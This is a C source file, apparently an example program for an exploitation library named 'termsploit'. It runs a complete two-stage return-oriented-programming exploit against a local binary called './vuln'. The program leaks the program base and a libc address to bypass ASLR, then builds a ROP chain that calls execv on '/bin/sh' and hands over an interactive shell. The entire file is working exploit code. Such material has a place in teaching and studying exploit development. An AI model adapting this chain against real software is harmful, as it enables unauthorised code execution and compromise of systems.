// ROP example exploit:
// - ASLR bypass using an address leak
// - ROP attack to get shell
// NOTE: unlike the simple example, this has a lot of moving parts so it probably
// needs changes before it can work on your machine
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <string.h>
#include <termsploit.h>

static uint64_t leakaddr(termsploit_ctx *ctx)
{
	char *line, *p;
	uint64_t addr;

	// Read leak
	line = termsploit_getline(ctx);
	p = strstr(line, "0x");
	if (!p) abort();
	// Convert to uint
	addr = strtoul(p + 2, NULL, 16);
	free(line);
	return addr;
}

#define W64(buf, val) *(uint64_t *) (buf) = val

int main(void)
{
	termsploit_ctx *ctx;
	uint64_t base, libc;
	char buf[4096];
	size_t bufsize;
	int exitcode;

	ctx = termsploit_alloc();
	if (termsploit_spawn(ctx, (char *[]) { "./vuln", NULL }) < 0) {
		perror("spawn");
		return 1;
	}

	// Leak program base
	base = leakaddr(ctx) - 0x1145;
	printf("base: %lx\n", base);

	// First stage to leak libc address
	memset(buf, 'A', sizeof buf);
	// rdi will have this string
	buf[1] = '%'; // %p as rsi will have _IO_stdfile_0_lock
	buf[2] = 'p';
	buf[3] = ' ';
	// Round to return address
	bufsize = 0x28;

	W64(buf + bufsize, base + 0x1030); // printf
	bufsize += 8;
	W64(buf + bufsize, base + 0x1145); // main
	bufsize += 8;
	// Add newline
	buf[bufsize++] = '\n';
	// Send payload
	termsploit_write(ctx, buf, bufsize);

	libc = leakaddr(ctx) - 0x1bd8d0;
	printf("libc: %lx\n", libc);

	// Now we can get a shell
	memset(buf, 'A', sizeof buf);
	// rdi will have this string
	strcpy(buf + 1, "/bin/sh");
	// Round to return address
	bufsize = 0x28;

	W64(buf + bufsize, base + 0x11e9); // pop rsi; pop r15
	bufsize += 8;
	W64(buf + bufsize, 0);
	bufsize += 8;
	W64(buf + bufsize, 0);
	bufsize += 8;

	W64(buf + bufsize, libc + 0xc6b60); // execv
	bufsize += 8;

	// Add newline
	buf[bufsize++] = '\n';
	// Send payload
	termsploit_write(ctx, buf, bufsize);

	// Got a shell?!
	termsploit_interactive(ctx);

	exitcode = termsploit_wait(ctx);
	printf("Process exited with %d\n", exitcode);

	termsploit_free(ctx);
	return 0;
}
